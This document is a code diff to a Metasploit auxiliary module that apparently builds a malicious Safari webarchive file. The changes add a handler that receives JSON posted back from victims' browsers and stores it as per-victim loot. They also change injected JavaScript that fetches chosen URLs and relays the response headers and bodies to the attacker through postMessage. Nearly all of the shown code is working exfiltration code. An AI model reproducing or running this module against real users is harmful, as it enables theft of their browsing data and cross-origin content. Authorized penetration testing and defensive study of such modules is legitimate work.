@@ -12,6 +12,7 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Auxiliary::Report
 
   # [Array<Array<Hash>>] list of poisonable scripts per user-specified URLS
   attr_accessor :scripts_to_poison
@@ -177,15 +178,37 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, request)
     begin
-      data = if request.body.size > 0
+      data_str = if request.body.size > 0
         request.body
       else
         request.qstring['data']
       end
-      data = JSON::parse(data || '')
-      print_status "Received data: #{data}"
-    rescue # json error, dismiss request & keep crit. server up
+      data = JSON::parse(data_str || '')
+      file = record_data(data, cli)
+      send_response_html(cli, '')
+      print_good "#{data_str.length} chars received and stored to #{file}"
+    rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up
+      print_error "Invalid JSON received: #{data_str}"
+      send_not_found(cli)
     end
+  end
+
+  # @param [Hash] data the data to store in the log
+  # @return [String] filename where we are storing the data
+  def record_data(data, cli)
+    @client_cache ||= Hash.new({})
+    @client_cache[cli.peerhost]['file'] ||= store_loot(
+      "safari.client", "text/plain", cli.peerhost, '', "safari_webarchive", "Webarchive Collected Data"
+    )
+    file = @client_cache[cli.peerhost]['file']
+
+    @client_cache[cli.peerhost]['data'] ||= []
+    @client_cache[cli.peerhost]['data'].push(data)
+    data_str = JSON.generate(@client_cache[cli.peerhost]['data'])
+
+    File.write(file, data_str)
+
+    file
   end
 
   ### ASSEMBLE THE WEBARCHIVE XML ###
@@ -531,9 +554,12 @@ class Metasploit3 < Msf::Auxiliary
           var sent = false;
           req.open('GET', '#{url}', true);
           req.onreadystatechange = function() {
-            if (!sent) {
-              sendData('response_headers', req.getAllResponseHeaders());
-              sendData('response_body', req.responseText);
+            if (req.readyState==4 && !sent) {
+              debugger;
+              sendData('#{url}', {
+                response_headers: req.getAllResponseHeaders(),
+                response_body: req.responseText
+              });
               sent = true;
             }
           };
@@ -647,8 +673,7 @@ class Metasploit3 < Msf::Auxiliary
       %Q|
         window.sendData = function(key, val) {
           var data = {};
-          if (key && val) data[key] = val;
-          if (!val)       data = key;
+          data[key] = val;
           window.top.postMessage(JSON.stringify(data), "*")
         };
       |
